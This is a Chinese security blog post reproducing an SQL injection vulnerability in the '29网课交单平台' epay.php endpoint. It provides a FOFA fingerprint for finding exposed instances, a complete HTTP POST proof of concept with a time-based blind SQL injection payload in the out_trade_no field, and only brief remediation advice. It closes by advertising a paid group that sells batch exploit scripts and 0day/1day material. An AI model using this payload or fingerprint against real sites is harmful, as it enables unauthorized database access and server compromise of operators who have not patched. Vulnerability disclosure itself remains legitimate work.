#  「漏洞复现」29网课交单平台 epay.php SQL注入漏洞   
冷漠安全  冷漠安全   2024-06-10 21:40  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
29网课交单平台是一个专注于在线教育和知识付费领域的交单平台。该平台基于PHP开发，通过全开源修复和优化，为用户提供了高效、稳定、安全的在线学习和交易环境。作为知识付费系统的重要组成部分，充分利用了互联网的优势，为用户提供了便捷的支付方式、高效的课程管理以及优质的用户体验。随着知识付费模式的普及和发展，该平台将为更多用户和教育机构提供优质的服务。  
  
0x03  
  
**漏洞威胁**  
  
29网课交单平台 /epay/epay.php 接口处存在SQL注入漏洞，未经授权攻击者可通过该漏洞获取数据库敏感信息，进一步利用可获取服务器权限，导致网站处于极度不安全状态。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
body="你在看什么呢？我写的代码好看吗"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0q6OXicPAvj9LnK1Kn2rSrgX6qSWosdCjuUx7LWLfDcCBLPf1G7Es5sTpjzrGPz5VxP2xz5z2RwyFg/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
POC  
```
POST /epay/epay.php HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Content-Type: application/x-www-form-urlencoded
Connection: close


out_trade_no=' AND (SELECT 8078 FROM (SELECT(SLEEP(5)))eEcA) AND 'aEmC'='aEmC
```  
  
延时5秒  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0q6OXicPAvj9LnK1Kn2rSrgXZTofhz14ZLzKRY4kibqqQPiaMUFAmPv3hIOKZjuok6JGAicWvg0BxPo1Q/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0q6OXicPAvj9LnK1Kn2rSrgXOuZLyIbHnUbdDrPGiasVYtXQYtmicG1zuDjXtqewZEGV2OeprueSXmrQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0q6OXicPAvj9LnK1Kn2rSrgX6tzFl1XmKdv2mtYXKF5icFJ1dQpxYHnMBPFNz0ox4yXiaxCP2oyWANzw/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0q6OXicPAvj9LnK1Kn2rSrgXB5wMq81vIns6ReMozmtotgx6qq6Xobia9jxWQ00nJ3S1YyEd8E4UXHQ/640?wx_fmt=gif&from=appmsg "")  
  
  
  
